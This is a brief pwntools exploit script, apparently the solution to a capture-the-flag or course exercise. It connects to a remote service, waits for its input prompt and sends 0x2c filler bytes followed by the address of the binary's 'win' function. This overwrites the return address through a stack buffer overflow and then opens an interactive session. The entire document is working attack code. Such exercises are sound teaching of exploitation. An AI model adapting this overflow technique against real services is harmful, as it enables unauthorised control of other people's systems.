from pwn import *

REMOTE_IP = "8c7e7da.678470.xyz"
REMOTE_PORT = 30310

elf = ELF("./assgn1_2o3BvZ6")

p = remote(REMOTE_IP, REMOTE_PORT)

p.readuntil(b"Enter your info: \n\n")

payload = b"0" * 0x2c
payload += p32(elf.sym["win"])

p.sendline(payload)

p.sendline()

p.interactive()
